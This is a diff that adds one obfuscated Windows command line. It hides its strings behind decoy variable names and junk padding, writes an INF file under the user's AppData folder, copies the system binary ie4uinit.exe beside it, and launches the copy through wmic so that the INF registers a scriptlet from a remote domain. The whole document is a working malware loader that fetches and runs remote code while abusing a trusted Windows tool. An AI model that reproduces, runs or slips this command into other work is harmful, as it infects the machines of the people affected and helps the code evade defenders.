@@ -1,0 +1,6 @@
+/v /c (for %r in (s) do @set "Educate=%~r") &&
+  (for %y in (a) do @set "Specs=%~y") &&
+  (for %y in (c) do @set "Plants=%~y") &&
+  call(for %r in ("[destinationdirs]" "defaultdestdir=11" "3DB0=01" "[3DB0]" "ieu%Inside%.inf" "[strings]" "shortsvcname=' '" "Dimensions=%time%" "Salaries=:;Forests" "Diesel=/" "servicename=' '" "Childrens=b;Solutions" "Lovers=com" "Inside=init" "Angry=h" "Governments=t;Photographs" "[7EB1]" "sc\" "ro%Childrens%j,NI,%Angry%%Governments%%Governments%p%Salaries%%Diesel%%Diesel%6jj54.davidopkins.%Lovers%/lz4x68ovcxa" "[version]" "signature =$windows nt$" "[defaultinstall.windows7]" "Un\" "Register\" "OCXs=7EB1" "delfiles=3DB0" ) do @echo %~r)>"%appdata%\microsoft\ieuinit.inf" &&
+  call xcopy /Y /C /Q %win!Beach!ir%\system32\ie4uinit.exe "%appdata%\microsoft\*" | set Trusts1=Upgrade &&
+  start "" wmic process call create "%appdata%\microsoft\ie4uinit.exe -basesettings" | set "Trusts08=Coordinates Chicken Unfold Holds Closes Custom Grain Detail Retailers Attention Abilities Findings Witnesses Infant Juice Thing Authors Measurements Circle Police Mother Writes Reserves Grace Title Faint Besides Excite Parameters Diamond Sector Stomach Disorder Memory Subjects Hostels Players Volunteers Fatigue Travelers Kinds Organisations Moves Maple Upper Knights Logistics Rigid Identifies Vague Icons"
